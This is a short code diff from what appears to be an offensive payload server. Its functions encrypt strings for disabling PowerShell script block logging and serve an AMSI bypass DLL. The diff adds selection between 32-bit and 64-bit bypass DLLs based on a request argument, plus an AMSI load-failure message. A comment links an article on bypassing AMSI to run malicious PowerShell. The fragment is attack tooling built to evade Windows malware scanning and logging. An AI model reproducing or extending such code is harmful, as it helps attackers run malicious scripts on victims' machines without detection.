@@ -267,6 +267,7 @@ def payload_0():
         "NonPublic,Static",
         "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
         "EnableScriptBlockLogging",
+        "Failed to load AMSI, aborting",
     ]
     encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                          in encrypted_strings]
@@ -307,7 +308,11 @@ def payload_l():
     """Load the AMSI Bypass DLL"""
     # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa
 
-    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
+    print(request.args)
+    if request.args['arch'] == 'x86':
+        filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
+    else:
+        filename = os.path.join(BASE_DIR, 'binary', 'amsi64.dll')
     with open(filename, 'rb') as f:
         DLL = f.read()
     DLL = b64encode(encrypt(b64encode(DLL), KEY))
